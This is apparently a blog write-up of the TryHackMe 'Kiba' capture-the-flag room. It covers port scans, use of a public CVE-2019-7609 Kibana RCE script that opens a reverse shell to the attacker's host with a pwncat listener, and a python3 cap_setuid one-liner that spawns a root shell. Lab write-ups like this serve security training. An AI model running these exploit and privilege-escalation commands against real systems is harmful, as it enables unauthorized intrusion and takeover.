@@ -1,0 +1,280 @@
+I"(<h2 id="description">Description:</h2>
+
+<p>The Following Post is writeup of Kiba room of tryhackme <a href="https://tryhackme.com/room/kiba">https://tryhackme.com/room/kiba</a></p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Machine</th>
+      <th style="text-align: left">Details</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">OS</td>
+      <td style="text-align: left">Linux</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Rating</td>
+      <td style="text-align: left">Easy</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Creator</td>
+      <td style="text-align: left">stuxnet</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="summary">Summary</h2>
+
+<p>The Room have 3 open ports 22,80 and 5601. We can notice an open kibana instance in 5601. Now on searching about
+  the version of kibana we got if have rce. Exploiting the rce and get a reverse shell. For PrivEsc it have a
+  setuid capability running that will spawn a root shell.</p>
+
+<h2 id="walkthrough">Walkthrough</h2>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>Let’s start with nmap scan.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+</pre></td> --><td class="rouge-code"><pre> ─[argenestel@parrot]─[~/Desktop/kiba]
+└──╼ <span class="nv">$nmap</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> nmap/kiba <span class="nt">-v</span> 10.10.166.67
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-08-29 14:42 IST
+NSE: Loaded 151 scripts <span class="k">for </span>scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 14:42
+Completed NSE at 14:42, 0.00s elapsed
+Initiating NSE at 14:42
+Completed NSE at 14:42, 0.00s elapsed
+Initiating NSE at 14:42
+Completed NSE at 14:42, 0.00s elapsed
+Initiating Ping Scan at 14:42
+Scanning 10.10.166.67 <span class="o">[</span>2 ports]
+Completed Ping Scan at 14:42, 0.43s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating Parallel DNS resolution of 1 host. at 14:42
+Completed Parallel DNS resolution of 1 host. at 14:42, 0.02s elapsed
+Initiating Connect Scan at 14:42
+Scanning 10.10.166.67 <span class="o">[</span>1000 ports]
+Discovered open port 22/tcp on 10.10.166.67
+Discovered open port 80/tcp on 10.10.166.67
+Increasing send delay <span class="k">for </span>10.10.166.67 from 0 to 5 due to 65 out of 216 dropped probes since last increase.
+Increasing send delay <span class="k">for </span>10.10.166.67 from 5 to 10 due to max_successful_tryno increase to 4
+Increasing send delay <span class="k">for </span>10.10.166.67 from 10 to 20 due to max_successful_tryno increase to 5
+Increasing send delay <span class="k">for </span>10.10.166.67 from 20 to 40 due to max_successful_tryno increase to 6
+Completed Connect Scan at 14:43, 42.87s elapsed <span class="o">(</span>1000 total ports<span class="o">)</span>
+Initiating Service scan at 14:43
+Scanning 2 services on 10.10.166.67
+Completed Service scan at 14:43, 6.79s elapsed <span class="o">(</span>2 services on 1 host<span class="o">)</span>
+NSE: Script scanning 10.10.166.67.
+Initiating NSE at 14:43
+Completed NSE at 14:43, 8.85s elapsed
+Initiating NSE at 14:43
+Completed NSE at 14:43, 1.25s elapsed
+Initiating NSE at 14:43
+Completed NSE at 14:43, 0.00s elapsed
+Nmap scan report <span class="k">for </span>10.10.166.67
+Host is up <span class="o">(</span>0.30s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods:
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>ah that’s 1000 port let’s see masscan</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td> --><td class="rouge-code"><pre>┌─[✗]─[argenestel@parrot]─[~/Desktop/argenestel.github.io]
+└──╼ <span class="nv">$sudo</span> masscan <span class="nt">-i</span> tun0 <span class="nt">-p0-10000</span> 10.10.34.204
+
+Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2020-09-01 21:34:21 GMT
+ <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
+Initiating SYN Stealth Scan
+Scanning 1 hosts <span class="o">[</span>10001 ports/host]
+Discovered open port 5601/tcp on 10.10.34.204                                  
+Discovered open port 80/tcp on 10.10.34.204                                    
+Discovered open port 22/tcp on 10.10.34.204
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Let’s start with kibana.</p>
+<h4 id="kibana">kibana</h4>
+
+<p><img src="/assets/img/kiba/openkibana.png" alt="kibana" /></p>
+
+<p>We can see an open kibana instance.<br />
+The version is 5.4.1 might be old let’s see for any exploits.</p>
+
+<p><img src="/assets/img/kiba/kibanatimelion.png" alt="timelion" /></p>
+
+<p>There is a remote code execution in kibana at timelion function we can search about it.</p>
+
+<p><a href="https://www.tenable.com/blog/cve-2019-7609-exploit-script-available-for-kibana-remote-code-execution-vulnerability">https://www.tenable.com/blog/cve-2019-7609-exploit-script-available-for-kibana-remote-code-execution-vulnerability</a></p>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<p><a href="https://github.com/LandGrey/CVE-2019-7609/">https://github.com/LandGrey/CVE-2019-7609/</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td> --><td class="rouge-code"><pre>└──╼ <span class="nv">$.</span>/CVE-2019-7609-kibana-rce.py <span class="nt">-u</span> http://10.10.166.67:5601 <span class="nt">-host</span> 10.9.124.57 <span class="nt">-port</span> 4444 <span class="nt">--shell</span>
+<span class="o">[</span>+] http://10.10.166.67:5601 maybe exists CVE-2019-7609 <span class="o">(</span>kibana &lt; 6.6.1 RCE<span class="o">)</span> vulnerability
+<span class="o">[</span>+] reverse shell completely! please check session on: 10.9.124.57:4444
+
+and
+
+┌─[argenestel@parrot]─[~/Downloads]
+└──╼ <span class="nv">$pwncat</span> <span class="nt">--listen</span> <span class="nt">--port</span> 4444
+<span class="o">[</span>15:55:23] received connection from 10.10.166.67:39932                                                                  connect.py:148
+<span class="o">[</span>15:55:26] new host w/ <span class="nb">hash </span>be486dbcf9a5edbfffd09b3f51163d7b                                                             victim.py:329
+<span class="o">[</span>15:55:43] pwncat running <span class="k">in</span> /bin/bash                                                                                   victim.py:362
+<span class="o">[</span>15:55:52] pwncat is ready 🐈                                                                                            victim.py:772
+
+
+<span class="o">(</span>remote<span class="o">)</span> kiba@ubuntu:/<span class="err">$</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>gotcha</p>
+
+<h3 id="privesc">PrivEsc</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre></td> --><td class="rouge-code"><pre>
+<span class="o">[</span>+] Capabilities
+<span class="o">[</span>i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+Current capabilities:
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapBnd: 0000003fffffffff
+CapAmb: 0000000000000000
+Shell capabilities:
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapBnd: 0000003fffffffff
+CapAmb: 0000000000000000
+Files with capabilities:
+/home/kiba/.hackmeplease/python3 <span class="o">=</span> cap_setuid+ep
+/usr/bin/mtr <span class="o">=</span> cap_net_raw+ep
+/usr/bin/traceroute6.iputils <span class="o">=</span> cap_net_raw+ep
+/usr/bin/systemd-detect-virt <span class="o">=</span> cap_dac_override,cap_sys_ptrace+ep
+
+so we got root
+
+
+<span class="o">(</span>remote<span class="o">)</span> kiba@ubuntu:/tmp<span class="nv">$ </span>/home/kiba/.hackmeplease/python3 <span class="nt">-c</span> <span class="s1">'import os; os.setuid(0); os.system("/bin/bash");'</span>
+To run a <span class="nb">command </span>as administrator <span class="o">(</span>user <span class="s2">"root"</span><span class="o">)</span>, use <span class="s2">"sudo &lt;command&gt;"</span><span class="nb">.</span>
+See <span class="s2">"man sudo_root"</span> <span class="k">for </span>details.
+
+root@ubuntu:/tmp#
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Rooted Kiba :)</p>
+:ET
